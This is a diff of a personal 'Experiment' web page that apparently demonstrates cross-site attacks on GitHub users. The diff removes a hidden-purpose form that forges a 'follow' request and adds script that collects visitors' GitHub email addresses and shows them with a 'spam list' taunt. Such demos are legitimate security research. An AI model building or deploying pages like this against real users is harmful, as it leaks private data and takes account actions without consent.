@@ -2,13 +2,19 @@
 <html xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" lang="en">
   <head>
     <title>Jeff Rafter</title>
+    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>
+    <script type="text/javascript" src="./email.js"></script>
+    <script type="text/javascript">
+      $(document).ready(function() {
+        GitHubEmail.init(function(){
+          alert("" + GitHubEmail.emails.join(',') + "\n\nYou have been added to our spam list.");
+        });
+      });
+    </script>
   </head>
   <body style="background:black">    
     <div style="width:400px;height:400px;left:50%;top:50%;position:absolute;margin-left:-200px;margin-right:-200px;">
       <h1 style="color:white">Experiment</h1>
-      <form action="http://github.com/user/follow/zapnap" method="post">
-        <input type="submit" value="You love zapnap"/>
-      </form>  
     </div>
   </body>
 </html>
